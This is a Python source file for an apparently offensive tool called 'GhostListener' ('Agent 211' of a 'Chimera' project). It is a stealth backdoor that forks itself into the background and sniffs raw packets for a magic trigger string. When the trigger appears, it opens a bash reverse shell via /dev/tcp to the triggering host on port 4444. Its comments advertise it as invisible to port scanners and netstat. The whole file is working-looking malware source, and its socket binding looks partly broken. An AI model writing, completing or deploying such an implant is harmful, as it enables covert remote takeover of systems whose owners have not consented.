#!/home/dan/Chimera_Project/venv/bin/python3
import socket
import os
import sys
import subprocess

class GhostListener:
    """
    Agent 211: Passive Stealth Listener.
    Uses raw sockets to sniff for a 'Magic String' trigger in network traffic.
    Invisible to standard port scanners and netstat.
    """
    def __init__(self, interface="eth0", trigger="CHIMERA_WAKE"):
        self.interface = interface
        self.trigger = trigger.encode()

    def listen(self):
        print(f"--- [AGENT 211: GHOST LISTENER ACTIVE on {self.interface}] ---")
        
        try:
            # Create a raw socket to sniff all IP packets
            # Requires ROOT privileges
            sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sniffer.bind((self.interface, 0))
        except PermissionError:
            print("[!] Error: Root privileges required for raw socket sniffing.")
            return

        while True:
            # Receive packet
            raw_data, addr = sniffer.recvfrom(65535)
            
            # Check if our 'Magic String' is anywhere in the payload
            if self.trigger in raw_data:
                print(f"[!!!] TRIGGER DETECTED FROM {addr[0]}. WAKING CHIMERA...")
                
                # Logic: Spawn a detached process to handle the callback
                # This keeps the sniffer running while the shell operates
                subprocess.Popen(
                    ["bash", "-c", f"bash -i >& /dev/tcp/{addr[0]}/4444 0>&1"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )

    def execute(self):
        # Fork the process to the background (Daemonize)
        if os.fork() > 0:
            sys.exit(0)
        
        os.setsid()
        if os.fork() > 0:
            sys.exit(0)
            
        self.listen()

if __name__ == "__main__":
    # In a real scenario, the interface would be dynamically identified
    if len(sys.argv) < 2:
        print("Usage: sudo ./main.py <interface> [optional_trigger]")
        sys.exit(1)
        
    iface = sys.argv[1]
    trig = sys.argv[2] if len(sys.argv) > 2 else "CHIMERA_WAKE"
    
    GhostListener(iface, trig).execute()
